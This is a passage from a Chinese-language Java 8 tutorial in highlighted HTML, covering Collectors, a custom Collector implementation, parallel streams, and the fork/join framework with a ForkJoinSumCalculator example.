<span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token function">groupingBy</span><span class="token punctuation">(</span><span class="token class-name">Dish</span><span class="token operator">::</span><span class="token function">getType</span><span class="token punctuation">,</span> 
    <span class="token function">collectingAndThen</span><span class="token punctuation">(</span><span class="token function">maxBy</span><span class="token punctuation">(</span><span class="token function">comparingInt</span><span class="token punctuation">(</span><span class="token class-name">Dish</span><span class="token operator">::</span><span class="token function">getCalories</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Optional</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Collectors-counting">Collectors.counting()</h3>
<h3 id="Collectors-maxBy">Collectors.maxBy</h3>
<h3 id="Collectors-minBy">Collectors.minBy</h3>
<h3 id="Collectors-summingInt，Collectors-summingLong，Collectors-summingDouble">Collectors.summingInt，Collectors.summingLong，Collectors.summingDouble</h3>
<h3 id="Collectors-averagingInt，Collectors-averagingLong，Collectors-averagingDouble">Collectors.averagingInt，Collectors.averagingLong，Collectors.averagingDouble</h3>
<h3 id="Collectors-summarizingInt">Collectors.summarizingInt</h3>
<h3 id="Collectors-joining">Collectors.joining</h3>
<h3 id="Collectors-partitioningBy-分区">Collectors.partitioningBy 分区</h3>
<p>好处：保留了分区函数返回 true 或 false 的两套流元素列表。<br>
与groupby的区别：需要一个谓词（返回一个布尔值的函数）</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Boolean</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">Dish</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> partitionedMenu <span class="token operator">=</span> menu<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token function">partitioningBy</span><span class="token punctuation">(</span><span class="token class-name">Dish</span><span class="token operator">::</span><span class="token function">isVegetarian</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//二级分区</span>
menu<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token function">partitioningBy</span><span class="token punctuation">(</span><span class="token class-name">Dish</span><span class="token operator">::</span><span class="token function">isVegetarian</span><span class="token punctuation">,</span> partitioningBy <span class="token punctuation">(</span>d <span class="token operator">-&gt;</span> d<span class="token punctuation">.</span><span class="token function">getCalories</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//联合其他收集器</span>
menu<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token function">partitioningBy</span><span class="token punctuation">(</span><span class="token class-name">Dish</span><span class="token operator">::</span><span class="token function">isVegetarian</span><span class="token punctuation">,</span> <span class="token function">counting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Collector-接口">Collector 接口</h2>
<h3 id="基本定义：">基本定义：</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Collector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token class-name">A</span><span class="token punctuation">,</span> <span class="token class-name">R</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
    <span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">A</span><span class="token punctuation">&gt;</span></span> <span class="token function">supplier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">BiConsumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">A</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token function">accumulator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">A</span><span class="token punctuation">,</span> <span class="token class-name">R</span><span class="token punctuation">&gt;</span></span> <span class="token function">finisher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">BinaryOperator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">A</span><span class="token punctuation">&gt;</span></span> <span class="token function">combiner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Characteristics</span><span class="token punctuation">&gt;</span></span> <span class="token function">characteristics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>T 是流中要收集的项目的泛型</li>
<li>A 是累加器的类型,累加器是在收集过程中用于累积部分结果的对象。</li>
<li>R 是收集操作得到的对象(通常但并不一定是集合)的类型。</li>
</ul>
<p>方法分析：</p>
<ul>
<li>建立新的结果容器: supplier 方法</li>
<li>将元素添加到结果容器: accumulator 方法</li>
<li>对结果容器应用最终转换: finisher 方法</li>
<li>合并两个结果容器: combiner 方法（并行归约）</li>
<li>characteristics 方法：返回一个不可变的 Characteristics 集合
<ol>
<li>UNORDERED：归约结果不受流中项目的遍历和累积顺序的影响</li>
<li>CONCURRENT：accumulator函数可以从多个线程同时调用,且该收集器可以并行归约流。如果收集器没有标为UNORDERED,那它仅在用于无序数据源时才可以并行归约</li>
<li>IDENTITY_FINISH：表明完成器方法返回的函数是一个恒等函数</li>
</ol>
</li>
</ul>
<h2 id="自定义收集器">自定义收集器</h2>
<p>必要时，可以根据自己需求实现收集器， 来避免一些不必要的操作（如装箱拆箱），这样子可以获取更好的性能。</p>
<p>测试用例如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testOwnCollector</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

       <span class="token keyword">class</span> <span class="token class-name">ToListCollector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token keyword">implements</span> <span class="token class-name">Collector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
           <span class="token annotation punctuation">@Override</span>
           <span class="token keyword">public</span> <span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> <span class="token function">supplier</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
               <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"supplier"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
               <span class="token keyword">return</span> <span class="token class-name">ArrayList</span><span class="token operator">::</span><span class="token keyword">new</span><span class="token punctuation">;</span>
           <span class="token punctuation">}</span>

           <span class="token annotation punctuation">@Override</span>
           <span class="token keyword">public</span> <span class="token class-name">BiConsumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token function">accumulator</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
               <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"accumulator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
               <span class="token keyword">return</span> <span class="token class-name">List</span><span class="token operator">::</span><span class="token function">add</span><span class="token punctuation">;</span>
           <span class="token punctuation">}</span>

           <span class="token annotation punctuation">@Override</span>
           <span class="token keyword">public</span> <span class="token class-name">BinaryOperator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> <span class="token function">combiner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
               <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"combiner"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
               <span class="token keyword">return</span> <span class="token punctuation">(</span>l1<span class="token punctuation">,</span> l2<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                   l1<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>l2<span class="token punctuation">)</span><span class="token punctuation">;</span>
                   <span class="token keyword">return</span> l1<span class="token punctuation">;</span>
               <span class="token punctuation">}</span><span class="token punctuation">;</span>
           <span class="token punctuation">}</span>

           <span class="token annotation punctuation">@Override</span>
           <span class="token keyword">public</span> <span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> <span class="token function">finisher</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
               <span class="token keyword">return</span> <span class="token class-name">Function</span><span class="token punctuation">.</span><span class="token function">identity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token punctuation">}</span>

           <span class="token annotation punctuation">@Override</span>
           <span class="token keyword">public</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Characteristics</span><span class="token punctuation">&gt;</span></span> <span class="token function">characteristics</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
               <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"characteristics"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
               <span class="token keyword">return</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">unmodifiableSet</span><span class="token punctuation">(</span><span class="token class-name">EnumSet</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token class-name">Characteristics</span><span class="token punctuation">.</span><span class="token constant">IDENTITY_FINISH</span><span class="token punctuation">,</span> <span class="token class-name">Characteristics</span><span class="token punctuation">.</span><span class="token constant">CONCURRENT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token punctuation">}</span>


           <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> log<span class="token punctuation">)</span> <span class="token punctuation">{</span>
               <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"-"</span> <span class="token operator">+</span> log<span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token punctuation">}</span>
       <span class="token punctuation">}</span>

       <span class="token class-name">Collector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> collector <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToListCollector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"e1"</span><span class="token punctuation">,</span> <span class="token string">"2r"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"s"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
       <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> e<span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">"[a-z]"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>collector<span class="token punctuation">)</span><span class="token punctuation">)</span>
               <span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                   <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                   <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">JSONObject</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
               <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>并行数据处理与性能</h1>
<h2 id="1-并行流处理数据">1. 并行流处理数据</h2>
<p>java 8 中提供了现成的并行处理流，即<code>parallelStream</code>。</p>
<h3 id="并行流与顺序流的转换">并行流与顺序流的转换</h3>
<p>对顺序流调用parallel方法，对并行流调用sequential方法。在合适的时候顺序流与并行流相互转换，可以提高效率。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">stream<span class="token punctuation">.</span><span class="token function">parallel</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">sequential</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">parallel</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注意点：</p>
<ul>
<li>保证在内核中并行执行工作的时间比在内核之间传输数据的时间长。</li>
<li>避免改变了某些共享状态</li>
</ul>
<h3 id="配置并行流使用的线程池">配置并行流使用的线程池</h3>
<p>并行流内部使用了默认的 ForkJoinPool， 它默认的线程数量就是你的处理器数量, 这个值是由<code>Runtime.getRuntime().availableProcessors()</code> 得到的。</p>
<p>可以通过系统属性java.util.concurrent.ForkJoinPool.common.parallelism 来改变线程池大小：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"java.util.concurrent.ForkJoinPool.common.parallelism"</span><span class="token punctuation">,</span><span class="token string">"12"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="如何高效使用：">如何高效使用：</h3>
<ul>
<li>测量</li>
<li>留意装箱</li>
<li>依赖于元素顺序的操作，本身在并行流上的性能就比顺序流差</li>
<li>流的操作流水线的总计算成本</li>
<li>数据少</li>
<li>数据结构是否易于分解</li>
<li>流自身的特点，以及流水线中的中间操作修改流的方式，都可能会改变分解过程的性能</li>
<li>终端操作中合并步骤的代价是大是小</li>
</ul>
<h2 id="2-分支-合并框架-The-fork-join-framework">2. 分支/合并框架(The fork/join framework)</h2>
<h3 id="目的">目的</h3>
<p>以递归方式将可以并行的任务拆分成更小的任务，然后将每个子任务的结果合并起来生成整体结果。（先拆，并行处理，合并结果）</p>
<h3 id="定义">定义</h3>
<p><code>RecursiveTask</code>是ExecutorService接口的一个实现，它把子任务分配给线程池（称为ForkJoinPool）中的工作线程。</p>
<h3 id="使用">使用</h3>
<p>实现<code>compute()</code>方法，提交至ForkJoinPool.invoke<br>
实际例子：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ForkJoinPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ForkJoinTask</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">RecursiveTask</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">LongStream</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ForkJoinSumCalculator</span> <span class="token keyword">extends</span> <span class="token class-name">RecursiveTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Long</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>

    <span class="token comment">// 拆分任务的标准大小</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> <span class="token constant">THRESHOLD</span> <span class="token operator">=</span> <span class="token number">10_000</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> numbers<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> start<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> end<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">ForkJoinSumCalculator</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> numbers<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">(</span>numbers<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> numbers<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token class-name">ForkJoinSumCalculator</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> numbers<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span> <span class="token keyword">int</span> end<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>numbers <span class="token operator">=</span> numbers<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>start <span class="token operator">=</span> start<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>end <span class="token operator">=</span> end<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 实现compute方法</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token class-name">Long</span> <span class="token function">compute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> length <span class="token operator">=</span> end <span class="token operator">-</span> start<span class="token punctuation">;</span> <span class="token comment">// 获取当前剩余任务的大小</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">&lt;=</span> <span class="token constant">THRESHOLD</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token function">computeSequentially</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// 创建另外一个子任务 leftTask</span>
        <span class="token class-name">ForkJoinSumCalculator</span> leftTask <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ForkJoinSumCalculator</span><span class="token punctuation">(</span>numbers<span class="token punctuation">,</span> start<span class="token punctuation">,</span> start <span class="token operator">+</span> length<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 异步执行 leftTask</span>
        leftTask<span class="token punctuation">.</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 创建剩余一半任务的子任务 rightTask</span>
        <span class="token class-name">ForkJoinSumCalculator</span> rightTask <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ForkJoinSumCalculator</span><span class="token punctuation">(</span>numbers<span class="token punctuation">,</span> start <span class="token operator">+</span> length<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 递归调用获取结果</span>
        <span class="token class-name">Long</span> rightResult <span class="token operator">=</span> rightTask<span class="token punctuation">.</span><span class="token function">compute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 获取 leftTask 结果</span>
        <span class="token class-name">Long</span> leftResult <span class="token operator">=</span> leftTask<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> leftResult <span class="token operator">+</span> rightResult<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">long</span> <span class="token function">computeSequentially</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">long</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> end<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            sum <span class="token operator">+=</span> numbers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> sum<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 如何调用fork/join框架</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">forkJoinSum</span><span class="token punctuation">(</span><span class="token keyword">long</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> numbers <span class="token operator">=</span> <span class="token class-name">LongStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ForkJoinTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Long</span><span class="token punctuation">&gt;</span></span> task <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ForkJoinSumCalculator</span><span class="token punctuation">(</span>numbers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ForkJoinPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="好的做法">好的做法</h3>
<ul>
<li>join方法会阻塞，所以先确保两个子任务全部启动，再调用join</li>
<li><code>RecursiveTask</code>内部不应该调用ForkJoinPool.invoke，应该直接调用compute、fork，只有顺序代码才应该用 invoke 来启动并行计算</li>
<li>一边子任务fork，一边子任务compute，避免在线程池中多分配一个任务造成的开销</li>
<li>调试使用分支/合并框架的并行计算可能有点棘手, 调用compute的线程并不是概念上的调用方(即调用fork的那个).</li>
<li>不应理所当然地认为在多核处理器上使用分支/合并框架就比顺序计算快。</li>
</ul>
<p><strong>工作窃取（work stealing）</strong><br>
目的：为解决因为每个子任务所花的时间可能天差地别而造成的效率低下。 过程：线程把任务保存到一个双向链式队列，当一个线程的队列空了，它就随机从其他线程的队列尾部“偷”一个任务执行</p>
<h3 id="思考">思考</h3>
<p>问：都是拆分任务，并行执行，为什么不使用线程池，如ThreadPoolExecutor呢？</p>
<p>答：Thread pool 默认期望它们所有执行的任务都是不相关的，可以尽可能的并行执行。<br>
而fork join框架解决的问题，是一个全局问题，所有子任务拆分运行后的结果，是要合并起来的。另外，<code>fork-join pool</code>另一个特点<code>work stealing</code>，如果用ThreadPoolExecutor实现是比较麻烦的</p>
<h2 id="3-Spliterator分割流">3. Spliterator分割流</h2>
<h3 id="简单了解">简单了解</h3>
<p>描述：一种自动机制来拆分流。新的接口“可分迭代器”（splitable iterator）</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Spliterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
    <span class="token keyword">boolean</span> <span class="token function">tryAdvance</span><span class="token punctuation">(</span><span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Spliterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token function">trySplit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">long</span> <span class="token function">estimateSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
